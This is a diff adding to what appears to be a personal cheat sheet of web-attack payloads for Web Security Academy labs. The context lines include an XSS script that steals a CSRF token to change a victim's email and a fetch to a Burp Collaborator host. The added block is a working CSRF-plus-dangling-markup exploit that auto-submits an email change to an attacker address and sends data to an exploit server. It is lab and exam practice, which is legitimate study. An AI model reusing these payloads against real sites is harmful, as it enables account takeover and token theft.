@@ -156,4 +156,40 @@ fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', 
 ```html
 <script> var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('get','/my-account',true); req.send(); function handleResponse() { var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; var changeReq = new XMLHttpRequest(); changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&email=test@test.com') }; </script>
 ```
-### CheatSheet Practice Exam
+
+### dsaf
+**Payload** :
+```html
+<body>
+<script>
+const academyFrontend = "https://0a5c0032040636aa80be173e008000ff.web-security-academy.net/";
+const exploitServer = "https://exploit-0a310020049c36a080de163201e90021.exploit-server.net/exploit";
+
+const url = new URL(location);
+const csrf = url.searchParams.get('csrf');
+
+
+if (csrf) {
+    const form = document.createElement('form');
+    const email = document.createElement('input');
+    const token = document.createElement('input');
+
+    token.name = 'csrf';
+    token.value = csrf;
+
+    email.name = 'email';
+    email.value = 'hacker@evil-user.net';
+
+    form.method = 'post';
+    form.action = `${academyFrontend}my-account/change-email`;
+    form.append(email);
+    form.append(token);
+    document.documentElement.append(form);
+    form.submit();
+} else {
+    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
+}
+</script>
+
+```
+
